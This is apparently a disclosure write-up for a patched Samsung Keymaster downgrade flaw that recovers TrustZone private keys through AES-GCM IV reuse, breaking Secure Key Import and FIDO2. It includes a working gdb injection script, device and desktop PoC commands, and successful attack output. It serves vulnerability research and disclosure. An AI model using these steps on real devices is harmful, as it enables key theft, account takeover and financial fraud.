# Downgrade Attack

## Summary

A privileged active attacker can extract private keys from the TrustZone, such as the keys used by the Secure Key Import and FIDO2 WebAuthn.

The attacker can force the Keymaster TA (Trusted Application) to generate hardware-protected keys and encrypt them in a way that is vulnerable to an IV reuse attack. The attacker is then able to exploit this vulnerability and recover the private keys.

This vulnerability follows [CVE-2021-25444](../iv_reuse/README.md), where we found that the Keymaster TA is vulnerable to an IV reuse attack that leads to immediate key recovery if the key derivation is deterministic - which is the case in v15 blobs and also v20 blobs on S9. Overall, every blob that is generated or imported into S9 can be fully recovered (and the following attacks also apply to S9).

In this attack, we show that an attacker can exploit the fact that newer devices - Galaxy S10, Galaxy S20, and Galaxy S21 - contained latent code that handles v15 key blobs encryption that is also vulnerable to IV reuse attacks. We show two realistic scenarios where the attacker can exploit this latent code to recover hardware-protected private keys. We show how using these private keys, the attacker can break the Secure Key Import protocol and bypass presence authentication in FIDO2.

The root cause of the vulnerability is the ability of an attacker with sufficient permissions (application context or root and SELinux context) in the Normal World to set the `KM_EKEY_BLOB_ENC_VER` tag in the ekey blob that the Keymaster TA checks in order to decide whether to encrypt with v15 or v20 encryption version. Additionally, there is latent code for the v15 encryption version which uses a deterministic KDF - therefore an attacker can perform the IV reuse attack on AES-GCM that we've shown in [CVE-2021-25444](../iv_reuse/README.md) and recover the full key material.

Affected models included models that were sold with Android P or later, including Samsung Galaxy S10, S20, and S21. Samsung assigned [CVE-2021-25490](https://security.samsungmobile.com/securityUpdate.smsb?year=2021&month=10) with High severity to the issue and released a patch that completely removes the legacy key blob implementation.

## Attack description

Consider an attack model where a device is infected with malware that has sufficient permissions to change the behavior of the Keystore daemon in the Normal World so that `generateKey`/`importKey` will add the `KM_EKEY_BLOB_ENC_VER` to the ekey blob before passing it to the TrustZone driver.

This can be done in various ways, e.g. malware with root permissions (e.g. after exploiting CVE-2020-28343), malware with code execution in the `keystored` process (e.g. by exploiting a memory corruption) or even a supply chain attack that patches the keystored process.

In this attack scenario, an attacker can force all new key blobs to become v15 and thus vulnerable to our attack (e.g. the PoC that we provided will extract the full key material). This is interesting since all future use of the device is impacted. The most impact is done in one of the following scenarios:

### Secure Key Import

The first interesting case is [Secure Key Import](https://developer.android.com/training/articles/keystore#ImportingEncryptedKeys).

As mentioned by Google in their [blog](https://security.googleblog.com/2018/12/new-keystore-features-keep-your-slice.html), this feature can be used by enterprises to securely share remote keys with devices, for instance SSH, RDP or S/MIME encryption keys. They also mention that Google Pay uses it to provision keys.

If a device that is used by an employee is compromised before the generation of the Wrapping Key Pair (in the Secure Key Import protocol - see the diagram in Google's blog), the Secure Key Import flow will be as [follows](https://developer.android.com/reference/android/security/keystore/WrappedKeyEntry):

1. The app calls `generateKey` to create the Wrapping Key Pair. When the Wrapping Key Pair is generated, the attacker will force the Keymaster TA to return a v15 ekey blob - let `wrappingKeyBlob` be the ekey blob.
2. The Wrapping Key Pair is attested and the attestation certificate is sent to the remote server - as usual [1].
3. The server verifies the attestation certificate - as usual [1].
4. The server generates an AES-GCM-256 key called `ephemeralKey`, xors it with a 32-bit value called `maskingKey` to get `transportKey`.
5. The server uses `ephemeralKey` and `initializationVector` to encrypt the key that it wants to import with AES-GCM - let's call the plaintext `keyData`, the ciphertext `encryptedKey` and let `tag` be the GCM tag.
6. The server uses the public key of `wrappingKeyBlob` to encrypt `transportKey` with RSA to get `encryptedTransportKey`.
7. The server sends `SecureKeyWrapper` which includes `encryptedTransportKey`, `initializationVector`, `encryptedKey` and `tag`.
8. Finally, Android asks Trustzone to securely import the wrapped key. Trustzone then uses `wrappingKeyBlob` (validates that it’s RSA with OAEP) to decrypt `transportKey`, xors it with `maskingKey` to get `ephemeralKey` and uses it and initalizationVector to decrypt keyData - then imports keyData.

The attacker needs to intercept `SecureKeyWrapper`, e.g. by viewing the memory of the application when it receives it, sniffing the network etc. Then he can use the IV reuse attack against the v15 blob `wrappingKeyBlob` to recover the private wrapping-key material and perform the final step 8 on his own to extract the keyData from the intercepted `SecureKeyWrapper`.

Overall, the attacker recovers the full key material of the secret server key in Normal World.
If the keys are shared with other devices, the attacker can steal valuable data and perform lateral movement (e.g. by connecting to other devices with SSH/RDP keys). Another example is if the keys are used by sensitive financial applications such as Google Pay or Samsung Pay.

The following figure[^1] from the paper illustrates the attack (in a simplified flow): ![secure_key_import.png](/images/secure_key_import.png "secure_key_import.png")

---

[1] The tag `KM_EKEY_BLOB_ENC_VER` is not included in the attestation [2], and attestation passes because the wrapping key is in secure hardware and has the expected key parameters (e.g. origin is ORIGIN_GENERATED).

[2] See [Verifying hardware-backed key pairs with Key Attestation](https://developer.android.com/training/articles/security-key-attestation) and [Key and ID Attestation](https://source.android.com/security/keystore/attestation) for the list of key parameters that are in the attestation certificate.

----

### FIDO2 WebAuthn

The second interesting case is FIDO2 [WebAuthn](https://www.w3.org/TR/webauthn-2/), which allows the creation and use of public-key cryptography to register and authenticate to websites instead of passwords. Android devices can use the Android Hardware-backed Keystore as a platform authenticator in order to perform the two main stages of WebAuthn:

1. Registration: the device creates a key pair and sends an attestation to the web server. If successful (attestation is verified), the server remembers the public key for the user.
2. Assertion: to login, the server sends a challenge to the device, the device requires user presence and authentication (e.g. biometric prompt) and after the user agrees signs the challenge with the private key that is in TrustZone. If the server verifies the signature (with the public key) - the user is logged in.

If the attacker forces new keys (during `generateKey`) to return v15 blobs, then after registration is complete the attacker can use the IV reuse attack to recover the full key material of the private key. Then, the attacker can login to the registered website whenever he desires - without user presence or authentication - by simply signing the Assertion challenge with the private key. This can lead to revealing sensitive data, stealing money (e.g. Paypal.com) or identity theft.

To demonstrate the downgrade attack, we attached `gdb_server` to the `android.hardware.keymaster@4.0-service` process, then ran the following commands (to add the `enc_ver` key parameter and force blobs to be generated as v15):

```gdb
# break before calling the keymaster
b *(nwd_generate_key + 100)

commands
printf "intercepted request to nwd_generate_key\n"

set $sizeof_param = (long)0x18
set $params = *(char **)$x21
set $num_params = *(long long *)($x21 + 8)
set $old_size = $num_params * $sizeof_param
set $new_size = $old_size + $sizeof_param

printf "copy old key parameters to new buffer\n"
set $new_params = (char *)malloc($new_size)
call (long)memset($new_params, 0, $new_size)
call (long)memcpy($new_params, $params, $old_size)

printf "add new parameter (KM_EKEY_BLOB_ENC_VER, 15)\n"
set *(long long *)($new_params + $old_size) = 0x30001390
set *(long long *)($new_params + $old_size + 8) = 0xf

printf "switch to new parameters - this forces the generation of a v15 blob\n"
set *(long long *)($x21) = $new_params
set *(long long *)($x21 + 8) = $num_params + 1

continue
end

b *(nwd_generate_key + 148)

commands
printf "dump the key blob that the keymaster returned\n"
set $len = *(char **)($x20 + 8)
set $start = *(char **)$x20
set $end = (char **)((long long)$start + $len)
printf "start %p, end %p, len %x\n", $start, $end, $len
dump binary memory result.bin $start $end
printf "dumped to result.bin\n"
continue
end
```

The following figure[^1] from the paper illustrates the attack (in a simplified flow): ![fido2.png](/images/fido2.png "fido2.png")

## PoC

To reproduce the PoC, perform the following steps:

1. Upload `keybuster` to the device (`adb push`) to `/data/local/tmp/`
    - If needed, compile it with `ndk-build -C jni`
2. Upload the PoC script (`poc_s10_secure_key_import.sh`) and the key that it uses to `/data/local/tmp/`
3. Set executable permissions `chmod +x /data/local/tmp/poc*`
4. Execute the PoC script
5. Download the `recovered-wrapping_key` to the desktop computer and continue the attack there
6. Run the server PoC script (`poc_server.py`) on the computer

An example of commands to run on the desktop computer:
```bash
adb push keybuster /data/local/tmp/keybuster  # can compile with `ndk-build -C jni` if needed
adb push poc_s10_secure_key_import.sh /data/local/tmp/
adb push rsa-4096-private-key.p8 /data/local/tmp/
```

An example of commands to run on the device:
```bash
adb shell
su # enter a strong context, e.g. by rooting with Magisk
cd /data/local/tmp
chmod +x poc*
./poc_s10_secure_key_import.sh
```

Then, run the following commands on the desktop computer:
```bash
# download the file of the recovered plaintext key material of the wrapping key (that the PoC on the device produced)
adb pull /data/local/tmp/recovered-wrapping_key

# Optional: verify correctness with "openssl rsa -inform DER -in recovered-wrapping_key -check -text"
# It should work as long as the key that we import (rsa-4096-private-key.p8) is longer which in our tests is always the case.

# convert recovered key to PEM
openssl rsa -inform DER -in recovered-wrapping_key -out pkey.pem

# create a python environment and install requirements
python3 -m venv .venv
source .venv/bin/activate
pip install -r poc_requirements.txt

# emulate the server after attestation and create server-secret-for-reference.bin to later verify the correctness of the attack
python poc_server.py pkey.pem out mask

# emulate the attacker and recover the secret
python poc_attacker.py pkey.pem out mask

# check that the attacker fully recovered the secret
diff server-secret-for-reference.bin recovered-secret.bin
echo $?
```

An example of the outputs in a successful attack:

1. On the Android device, e.g. S10:
```bash
 # ./poc_s10_secure_key_import.sh
Attack log: /data/local/tmp/attack.log
----------------------------------------------------------------------------------------------------
1. Generating RSA wrapping key as v15 ekey blob... (wait for it) done
----------------------------------------------------------------------------------------------------
2. Extract the IV and encrypted ASN1 of the ekey blob... done
----------------------------------------------------------------------------------------------------
3. reuse the IV of the target blob to import a known key (must be larger)... done
----------------------------------------------------------------------------------------------------
4. perform the IV reuse attack to recover the private key material of wrapping key... done
----------------------------------------------------------------------------------------------------
On your computer, download the recovered key using "adb pull /data/local/tmp/recovered-wrapping_key"
then verify it with "openssl rsa -inform DER -in recovered-wrapping_key -check -text"
```

2. On a computer (note: the secret and other keys are randomized in each server execution):

```bash
$ python scripts/poc_server.py pkey.pem out mask
[DEBUG] wrapping_key_public.e: 0x10001
[INFO] secret: b'0e735899e919823708bb04abb8de9ca618437a8ee41f1c2d9d038161c40c9de9'
[DEBUG] creating server-secret-for-reference.bin
[DEBUG] iv: b'3411dd3ec6932a8b8987d2e0'
[DEBUG] ephemeral_key: b'38381e2462da4ebf4f0bf304b233f3e96ca1082d309b8a7ac8f7db5145fd8df2'
[DEBUG] xor_mask: b'0000000000000000000000000000000000000000000000000000000000000000'
[DEBUG] transport_key: b'38381e2462da4ebf4f0bf304b233f3e96ca1082d309b8a7ac8f7db5145fd8df2'
[DEBUG] wrapping the transport key with the public RSA wrapping key
[DEBUG] encrypting the secure secret with the AES ephermeral key
[DEBUG] encrypted_secret: b'6cb0284d7c8b3f4f38ac29fa44feb890a75aedbe52ad28126f03e1bfa2a51f42'
[DEBUG] tag: b'4d1711c66176669997f39bfa0ef6deec'
[DEBUG] creating out
[DEBUG] creating mask

$ python scripts/poc_attacker.py pkey.pem out mask
[DEBUG] wrapping_key_private.d: 0x348994d73e8272ba1cc29ae749a2386fb59ad0bab1ece1c171f3571619a2d44128cd0a365c5e8328ea867bb69c2dfb2c1f143936757d464ad358b7ebe4f5263e5461e377eb593101429bfc1d97cc3336ccdbea0cc97525b93f78f6825a90cec3c0f0b95572b3444391b0e3b39e363c81e0526f8b65030b0c91cbfe5254294f27cf16660867ac83aef96a5825163541c29dfcdaeeda5916f4140ffe2aa73deb61ae87ba4b15286247058ff436b947ce99f26d0495ac384dbb67d850c1a572b88eee7151627855cd3051ddb64abeaa8cefc60d5eed294c6823ab74f3dcc05a49cfadcd34ead038b063f70e442473e29dc47e874064259cab33d894a7a40caa8f05f8a0d8d4bb0b2454700509e0221ce49e9a0efe7765190746b1856437e11ed617a2ecd46327abc29b853496c5a33419cfd9522b26a3aeadded7e5c1e2936006e4d0523b8a0835a5e501031a0c21f82973f8955f7ac74aa7ce5a14ae6cb00943d948679994523f03e2178a2ffa8d8ad75032454acaa80e8a63a9ffe01b24f0f1bfb0c0c92e391de01eb4ffca4ba4884ecf8ca26da81613df2dae437f293ffc525acd62d90b48ba02347c3341b2b359fcb0e2e71419c3e9844f8e7e0f0fbea3e5260bb9471788cc0fce0ef78572fa0408b7b1d64a15d21a27a4134bbbb85368c1d4d28ab3d81de2b564d620833b8100329c8c6c3df0e3dbf288b0f578c28d208f1
[DEBUG] encrypted_transport_key: b'2052fee458a08ab3a6c0ee0ec16cde40b11606f41366bf35e456e477ff878fc6422cb8c5be8f8818301235cdad589fe0354690233fe092c814b6c1db699999048765f4b0ea579e9d71f1e697dad109e597a304dc7a383f6f12e3d9c24984b2e94d09fa0e93a88e82552f71319e36bd199db684550b5a3932b80c763d8fa5e275f3987c47cceb52709018ad31fe0742c7c26692e5a21ea2f2261cd9d60948a6be06dd936dc85b2764c0f044bbad9be94d983b23f0f84296aea0659f484bf31e3548055ddded2b97599c5119dd023ad356ee2763f479e9784116cca0666b4048ac8cc1a0c2f181eed8be84e4a3814802cd7ebcf4ac5f3ae2306b8f7bc95bf780192c65b8231cff152a2d38cefc1579ebc959cbdfca6b2871875a26cd9672701acfa00f5d896a52ad6a9c47f2bfa2b391f25fd89ee9acec9a12c84d68205f79fbd30645541c6efe3c21ee3bf3c9d1e99b8025eb4797597033164f818d0dbfb955ce097f130ee3eb963fb7915a0742e7cf5e174fc21d2bc9d1a4195059d35bc264fe7fe882f6e3074a3be0a7187e18974409fecb63cd276e38459fcb8335702583004cb2b92ec057c8f9460474f80354a6c3e80e8992695117a5d93d093bb13035ebd2c47eb8f8e2bc3788bd765de801229ee34402a5a05d1c0ed710a2bc46aee48089698ab68df50a37e9055460500e52afed8db31af511c3f33947d3c7a7b8d0aa'
[DEBUG] iv: b'3411dd3ec6932a8b8987d2e0'
[DEBUG] encrypted_secret: b'6cb0284d7c8b3f4f38ac29fa44feb890a75aedbe52ad28126f03e1bfa2a51f42'
[DEBUG] tag: b'4d1711c66176669997f39bfa0ef6deec'
[DEBUG] unwrapping the transport key with the recovered private RSA wrapping key
[DEBUG] decrypted transport_key: b'38381e2462da4ebf4f0bf304b233f3e96ca1082d309b8a7ac8f7db5145fd8df2'
[DEBUG] ephemeral_key: b'38381e2462da4ebf4f0bf304b233f3e96ca1082d309b8a7ac8f7db5145fd8df2'
[DEBUG] decrypting the secure secret with the AES ephermeral key
[INFO] decrypted secret: b'0e735899e919823708bb04abb8de9ca618437a8ee41f1c2d9d038161c40c9de9'

$ diff server-secret-for-reference.bin recovered-secret.bin 
$ echo $?
0
```

[^1]: Designed using resources from Flaticon.com
